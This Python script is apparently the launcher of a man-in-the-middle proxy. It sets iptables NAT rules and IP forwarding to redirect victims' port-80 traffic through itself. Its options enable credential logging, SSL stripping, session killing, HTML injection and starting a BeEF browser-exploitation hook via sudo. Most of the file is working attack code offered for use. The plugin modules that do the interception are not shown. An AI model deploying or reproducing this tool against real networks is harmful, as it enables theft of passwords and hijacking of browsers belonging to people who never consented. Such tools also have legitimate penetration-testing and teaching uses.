#!/usr/bin/env python

""" starts proxyserver to listen for requests
    and attaches plugins to read and manipulate

    usage: proxy.py [options]

    optional arguments:
      -h, --help         Show this help message and exit
      -l, --loglevel=X   logging level [default: 10]

      -a, --auth         Log userids/passwords
      -b, --beef         Inject beef hook (browser exploitation framework)
      -c, --cats         Replace images with cats
      -f, --favicon      Send lock favicon
      -i, --inject       Inject data/injection.html
      -k, --kill         Kill session on first visit to domain
      -r, --logrequests  Log requests
      -s, --sslstrip     Replace https with http then proxy links via https
      -u, --upsidedown   Show images upsidedown
"""
from tools.logs import log, logfile
from docopt import docopt

from mim.proxyserver import ProxyFactory
from twisted.internet import reactor
import os

from tools import fileserver
from tools.tools import su, setTitle, call
from tools.bash import ifconfig
from version import __version__

PROXYPORT = 10000
BEEFPORT = 3000
FILESERVER = ifconfig().wlanip
FILEPORT = 8000

here = os.path.abspath(os.path.dirname(__file__))
os.chdir(here)

def main():
    """ run proxy server and setup callbacks """
    
    # setup logging
    with open(logfile, 'w'):
        pass
    args = docopt(__doc__, version=__version__)
    log.info(args)
    log.setLevel(int(args["--loglevel"]))

    # connect plugins
    from plugins import otherplugins
    otherplugins.init(args, BEEFPORT, FILESERVER, FILEPORT)
    # get files in plugins folder
    folder = otherplugins.__file__
    folder = folder[:folder.rfind("/")]
    for module in os.listdir(folder):
        if module in ('__init__.py', 'otherplugins.py') or not module.endswith('.py'):
            continue
        module = module[:-3]
        if args["--%s"%module]:
            __import__("plugins.%s"%module)

    # create firewall gateway and route port 80 to proxy
    su("./fwreset")
    su("sysctl net.ipv4.ip_forward=1")
    su("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port %s"%PROXYPORT)
    su("iptables -t nat -A POSTROUTING -j MASQUERADE")
    log.info("iptables redirecting port 80==>%s"%PROXYPORT)

    # start servers
    if args["--cats"] or args["--inject"]:
        reactor.listenTCP(FILEPORT, fileserver.Site(fileserver.Data(os.getcwd()+"/data")))
        log.info("starting file server on %s:%s" %(FILESERVER, FILEPORT))

    if args["--beef"]:
        os.chdir("/usr/share/beef-xss")
        call(['sudo', './beef'])
        log.info("starting beef server on %s" %BEEFPORT)

    reactor.listenTCP(PROXYPORT, ProxyFactory())
    log.info("starting proxy server on port %s"%PROXYPORT)
    reactor.run()
    
    su("./fwreset")

if __name__ == '__main__':
    setTitle(__file__)
    main()